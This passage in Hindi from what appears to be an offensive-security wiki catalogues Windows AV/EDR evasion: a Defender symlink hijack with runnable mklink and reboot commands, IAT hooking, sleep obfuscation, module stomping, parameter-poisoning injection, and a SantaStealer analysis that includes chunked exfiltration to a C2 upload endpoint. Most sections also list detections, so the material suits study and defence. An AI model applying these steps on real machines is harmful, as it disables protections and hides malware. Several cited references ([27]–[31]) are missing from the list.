- ClipUp द्वारा लिखी जाने वाली सामग्री को placement के अलावा नियंत्रित नहीं किया जा सकता; यह primitive precise content injection के बजाय corruption के लिए उपयुक्त है।
- किसी service को install/start करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing critical है: target open नहीं होना चाहिए; boot-time execution file locks से बचाता है।

Detections
- असामान्य arguments के साथ `ClipUp.exe` का process creation, विशेष रूप से boot के आसपास non-standard launchers द्वारा parent किए जाने पर।
- Suspicious binaries को auto-start करने के लिए configured नई services, जो लगातार Defender/AV से पहले start होती हैं। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा unexpected file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा anomalous PPL level usage की जाँच करें।

Mitigations
- WDAC/Code Integrity: नियंत्रित करें कि कौन-से signed binaries PPL के रूप में और किन parents के अंतर्गत run कर सकते हैं; legitimate contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services के creation/modification को restrict करें और start-order manipulation को monitor करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption का संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के साथ compatible हो, तो security tooling वाले volumes पर 8.3 short-name generation को disable करने पर विचार करें (पूरी तरह test करें)।

## Platform Version Folder Symlink Hijack के माध्यम से Microsoft Defender से छेड़छाड़

Windows Defender उस platform का चयन इन subfolders को enumerate करके करता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह highest lexicographic version string वाले subfolder का चयन करता है (जैसे, `4.18.25070.5-0`), फिर वहीं से Defender service processes start करता है (service/registry paths को उसी के अनुसार update करते हुए)। यह selection directory entries पर भरोसा करता है, जिनमें directory reparse points (symlinks) भी शामिल हैं। कोई administrator Defender को attacker-writable path पर redirect करने और DLL sideloading या service disruption हासिल करने के लिए इसका लाभ उठा सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform re-selection trigger करने की ability (boot पर service restart)
- केवल built-in tools आवश्यक हैं (mklink)

Why it works
- Defender अपने folders में writes को block करता है, लेकिन इसका platform selection directory entries पर भरोसा करता है और lexicographically highest version चुनता है, बिना यह validate किए कि target किसी protected/trusted path पर resolve होता है।

Step-by-step (example)
1) Current platform folder का एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर आपके folder की ओर संकेत करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger का चयन (reboot recommended):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाली service configuration/registry दिखाई देनी चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender द्वारा अपनी application directory से load की जाने वाली DLLs को code execute करने के लिए drop/replace करें। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink हटाएँ, ताकि अगले start पर configured path resolve न हो और Defender start होने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह technique अपने आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से हटाकर target module के अंदर ले जा सकती हैं, इसकी Import Address Table (IAT) को hook करके और चुने गए APIs को attacker-controlled, position‑independent code (PIC) के माध्यम से route करके। यह approach evasion को उन छोटे API surface से आगे generalise करती है जिन्हें कई kits expose करते हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post‑exploitation DLLs तक भी बढ़ाती है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- Reflective loader (prepended या companion) का उपयोग करके target module के साथ एक PIC blob stage करें। PIC self‑contained और position-independent होना चाहिए।
- Host DLL load होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को walk करें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के लिए IAT entries को thin PIC wrappers की ओर point करने हेतु patch करें।
- प्रत्येक PIC wrapper real API address को tail-call करने से पहले evasions execute करता है। Typical evasions में शामिल हैं:
- Call के आसपास memory को mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX, page names/permissions बदलना), फिर call के बाद restore करना।
- Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis expected frames को resolve करे।<sup>[[9]](#references)</sup>
- Compatibility के लिए एक interface export करें, ताकि Aggressor script (या equivalent) Beacon, BOFs और post-ex DLLs के लिए hook किए जाने वाले APIs register कर सके।

यहाँ IAT hooking क्यों
- यह ऐसे किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है, tool code को modify करने या specific APIs को proxy करने के लिए Beacon पर निर्भर रहने की आवश्यकता के बिना।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call-stack–based detections के विरुद्ध process-spawning post-ex commands का reliable उपयोग restore करता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders loaded module के DllMain के दौरान hooking प्रदर्शित करते हैं।
- Wrappers को छोटा और PIC-safe रखें; patch करने से पहले capture किए गए original IAT value या LdrGetProcedureAddress के माध्यम से वास्तविक API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages को खुला छोड़ने से बचें।

Call-stack spoofing stub
- Draugr-style PIC stubs एक fake call chain बनाते हैं (benign modules के अंदर return addresses) और फिर real API में pivot करते हैं।
- यह उन detections को विफल करता है जो Beacon/BOFs से sensitive APIs तक canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले expected frames के अंदर पहुंचने के लिए इसे stack cutting/stack stitching techniques के साथ उपयोग करें।

Operational integration
- Reflective loader को post-ex DLLs के आगे जोड़ें, ताकि DLL load होने पर PIC और hooks स्वतः initialize हो जाएं।
- Target APIs को register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs बिना code changes के उसी evasion path से पारदर्शी रूप से लाभ उठा सकें।

Detection/DFIR considerations
- IAT integrity: ऐसे entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers का periodic verification।
- Stack anomalies: loaded images से संबंधित न होने वाले return addresses; non-image PIC में अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को modify करने वाली early DllMain activity, load के समय बनाए गए unexpected RX regions।
- Image-load evasion: यदि LoadLibrary* को hook किया गया है, तो memory masking events से correlated automation/clr assemblies के suspicious loads को monitor करें।

Related building blocks and examples
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

यदि आप किसी reflective loader को नियंत्रित करते हैं, तो `ProcessImports()` के दौरान imports को hook कर सकते हैं, loader के `GetProcAddress` pointer को ऐसे custom resolver से replace करके जो पहले hooks की जांच करता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएं, जो transient loader PIC के स्वयं को free करने के बाद भी बना रहे।
- एक `setup_hooks()` function export करें, जो loader के import resolver को overwrite करता है (जैसे, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को skip करें और `__resolve_hook(ror13hash(name))` जैसे hash-based hook lookup का उपयोग करें। यदि hook मौजूद हो, तो उसे return करें; अन्यथा वास्तविक `GetProcAddress` को delegate करें।
- Crystal Palace की `addhook "MODULE$Func" "hook"` entries के साथ link time पर hook targets register करें। Hook valid रहता है क्योंकि वह resident PICO के अंदर रहता है।

इससे loaded DLL के code section को post-load patch किए बिना **import-time IAT redirection** प्राप्त होती है।

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks तभी trigger होते हैं जब function वास्तव में target के IAT में मौजूद हो। यदि कोई module PEB-walk + hash के माध्यम से APIs resolve करता है (और कोई import entry नहीं होती), तो वास्तविक import force करें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से replace करें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve किए जाने पर interception सक्षम हो जाती है।

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` को patch करने के बजाय, implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। Long waits के लिए call को Ekko-style obfuscation chain में wrap करें, जो idle के दौरान in-memory image को encrypt करती है:<sup>[[31]](#references)[[27]](#references)</sup>

- Callbacks का sequence schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करते हैं।
- Typical chain (x64): image को `PAGE_READWRITE` पर set करें → पूरी mapped image पर `advapi32!SystemFunction032` के माध्यम से RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections को walk करके **per-section permissions restore** करें → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` प्रदान करता है; इसे कई frames में clone करें और प्रत्येक step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) set करें।

Operational detail: Long waits के लिए “success” (जैसे, `WAIT_OBJECT_0`) return करें, ताकि image masked रहते हुए caller आगे बढ़ता रहे। यह pattern idle windows के दौरान module को scanners से छिपाता है और classic “patched `Sleep()`” signature से बचता है।

Detection ideas (telemetry-based)
- `NtContinue` की ओर point करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- Large contiguous image-sized buffers पर उपयोग किया गया `advapi32!SystemFunction032`।
- Large-range `VirtualProtect`, जिसके बाद custom per-section permission restoration हो।

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आमतौर पर process को `STATUS_STACK_BUFFER_OVERRUN` के साथ crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes के अंदर Ekko/Kraken-style chains को चालू रखने के लिए:<sup>[[30]](#references)</sup>

- Chain द्वारा उपयोग किए जाने वाले प्रत्येक indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर मौजूद addresses के लिए `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **पूर्ण image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget को ही नहीं, बल्कि indirectly reached exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और उन attacker-controlled executable sections को भी mark करें, जो indirect targets बनेंगे।

यह ROP/JOP-style sleep chains को “केवल non-CFG processes में काम करता है” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compiled अन्य endpoints के लिए reusable primitive बना देता है।

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement noisy हो सकता है और CET Shadow Stack systems पर fail हो सकता है, क्योंकि spoofed `Rip` का hardware shadow stack के साथ सहमत होना आवश्यक है। एक safer sleep-masking pattern है:<sup>[[30]](#references)</sup>

- उसी process में किसी अन्य thread को चुनें और `NtQueryInformationThread` के माध्यम से उसका `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- Current thread के वास्तविक TEB/TIB का backup लें।
- `GetThreadContext` के साथ वास्तविक sleeping context capture करें।
- **केवल** वास्तविक `Rip` को spoof context में copy करें और spoofed `Rsp`/stack state को intact छोड़ें।
- Sleep window के दौरान spoof thread के `NT_TIB` को current TEB में copy करें, ताकि stack walkers legitimate stack range के अंदर unwind करें।
- Wait समाप्त होने के बाद original TIB और thread context restore करें।

यह CET-consistent instruction pointer को बनाए रखता है, जबकि उन EDR stack walkers को भ्रमित करता है जो unwinds validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based alternative: Kraken Mask

यदि timer-queue dispatch बहुत signatured है, तो यही sleep-encrypt-spoof-restore sequence queued APCs का उपयोग करने वाले suspended helper thread से execute किया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` के साथ helper thread बनाएं।
- `NtQueueApcThread` से prepared `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack को exhaust करने से बचने के लिए chain state को helper stack के बजाय heap पर store करें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा half-restored stack पकड़े जाने वाली race window कम हो।

यह समान RC4 masking और stack-spoofing goals को बनाए रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature को helper-thread/APC signature से बदल देता है।

Additional detection ideas
- Sleep, waits या APC dispatch से कुछ समय पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory`।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास wrapped `GetThreadContext`/`SetThreadContext`।
- `NtQueryInformationThread` के बाद current thread के TEB/TIB stack bounds में direct writes।
- ऐसे `NtQueueApcThread`/`NtAlertResumeThread` chains जो indirectly `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुंचती हैं।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसे short gadget signatures का repeated उपयोग।


## Precision Module Stomping

Module stomping target process के अंदर पहले से mapped DLL के **`.text` section से payloads execute** करता है, बजाय इसके कि स्पष्ट private executable memory allocate की जाए या कोई fresh sacrificial DLL load की जाए। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space उन code paths को corrupt किए बिना payload को समाहित कर सके जिनकी process को अभी भी आवश्यकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` या `comctl32.dll` जैसे common modules के विरुद्ध naive stomping fragile होता है: DLL remote process में loaded नहीं हो सकती, और बहुत छोटा code region process को crash कर देगा। अधिक reliable workflow:

1. Target process modules enumerate करें और पहले से loaded DLLs की **names-only include list** रखें।
2. पहले payload build करें और उसका **exact byte size** record करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से अधिक महत्वपूर्ण है, क्योंकि यह executable section के **memory में mapped होने पर आकार** को दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp start offset के रूप में किसी exported function RVA को चुनें।
5. **Blast radius** calculate करें: यदि payload selected function boundary से बड़ा है, तो वह memory में उसके बाद स्थित adjacent exports को overwrite कर देगा।

Wild में देखे जाने वाले Typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Remote process में **already loaded** DLLs को प्राथमिकता दें, ताकि `LoadLibrary`/unexpected image loads की telemetry से बचा जा सके।
- ऐसे exports को प्राथमिकता दें जिन्हें target application बहुत कम execute करता हो; अन्यथा thread creation से पहले या बाद में सामान्य code paths stomped bytes को hit कर सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना आवश्यक होता है, ताकि पूरा buffer injector source में सही ढंग से represent हो।

Detection ideas
- अधिक सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में Remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से match नहीं करते।
- Remote threads या context pivots, जो किसी legitimate DLL export के भीतर execution शुरू करते हैं और जिनके first bytes को हाल ही में modify किया गया हो।
- DLL `.text` pages पर thread creation के बाद होने वाले संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows **चयनित `CreateProcessW` startup parameters को child process में copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) के अंदर store करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Useful carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (with `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए और यह null terminator सहित अधिकतम **32,767 Unicode characters** तक सीमित है।
- `lpEnvironment` लगातार `NAME=VALUE\0` strings वाला Unicode environment block होना चाहिए, जिसके अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` officially reserved है, इसलिए `ShellInfo` mapping को stable documented contract के बजाय implementation detail माना जाना चाहिए।

इससे normal process creation **payload-transfer primitive** में बदल जाती है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote lookup flow without remote write APIs

Child बनने के बाद, copied buffer को **read-only** primitives से resolve करें:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` को follow करें
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. Selected pointer का उपयोग करें:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### कॉपी किए गए parameter buffer को execute करना

कॉपी किया गया parameter region आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain है:

1. Process को सामान्य रूप से create करें (suspended नहीं)
2. चुने गए parameter page को `NtProtectVirtualMemory` / `VirtualProtectEx` के साथ executable बनाएं
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का reuse करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) के साथ execution को redirect करें

Classic thread hijacking workflows के विपरीत, इसमें **`SuspendThread` / `ResumeThread` की आवश्यकता नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर monitor की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` भी

### Null-byte limitation और staged shellcode

तीनों carriers **string या string-like data** हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। इसका practical workaround एक **null-free first stage** है, जो runtime पर constants को reconstruct करता है और फिर किसी भी arbitrary second stage को load करता है।

एक सरल pattern XOR-based constant synthesis है:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
यह first stage को transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बनाने देता है।

### First stage से Stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` के साथ इसे `PAGE_EXECUTE_READ` में बदला जा सकता है और उस पर jump किया जा सकता है, जिससे direct RWX allocation से बचा जा सकता है।

### Detection ideas

Authors द्वारा बताए गए अच्छे hunting opportunities:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread` का उपयोग
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` के remote reads
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 स्वयं में एक पूर्ण execution primitive नहीं, बल्कि **cross-process transfer trick** है: copied parameter को अभी भी execute-permission change और execution redirection method की आवश्यकता होती है।
- `RtlCreateProcessReflection` / Dirty Vanity पर authors ने विचार किया था, लेकिन इसे अस्वीकार कर दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives तक पहुंचता है।

## Fileless Evasion और Credential Theft के लिए SantaStealer Tradecraft

SantaStealer (aka BluelineStealer) दिखाता है कि modern info-stealers किस तरह AV bypass, anti-analysis और credential access को एक ही workflow में मिलाते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`) `GetKeyboardLayoutList` के जरिए installed keyboard layouts को enumerate करता है। यदि कोई Cyrillic layout मिलता है, तो sample एक empty `CIS` marker drop करके stealers चलाने से पहले terminate हो जाता है। इससे यह सुनिश्चित होता है कि excluded locales पर यह कभी detonate न हो, जबकि hunting artifact बना रहता है।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A process list पर चलता है, प्रत्येक नाम को custom rolling checksum से hash करता है और debuggers/sandboxes के लिए embedded blocklists से तुलना करता है; यह computer name पर भी checksum दोहराता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties (process-count floor, recent uptime) का निरीक्षण करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` को call करता है, और single-stepping का पता लगाने के लिए sleeps के आसपास timing checks करता है। कोई भी hit modules launch होने से पहले abort कर देता है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे या तो disk पर drop किया जाता है या memory में manually mapped किया जाता है; fileless mode imports/relocations को स्वयं resolve करता है, इसलिए helper artifacts लिखे नहीं जाते।
- वह helper second-stage DLL को ChaCha20 से दो बार encrypted रखता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, वह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से derived exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` को call करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके live Chromium browser में inject होते हैं, AppBound Encryption keys inherit करते हैं, और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करते हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और प्रत्येक enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, आदि) के लिए एक thread spawn करता है। प्रत्येक thread results को shared buffers में लिखता है और लगभग 45s की join window के बाद अपनी file count report करता है।
- समाप्त होने के बाद, statically linked `miniz` library से सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s तक sleep करता है और archive को HTTP POST के माध्यम से 10 MB chunks में `http://<C2>:6767/upload` पर stream करता है, तथा browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) को spoof करता है। प्रत्येक chunk में `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` जोड़े जाते हैं, और अंतिम chunk में `complete: true` जोड़ा जाता है ताकि C2 को पता चल सके कि reassembly पूरी हो गई है।

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
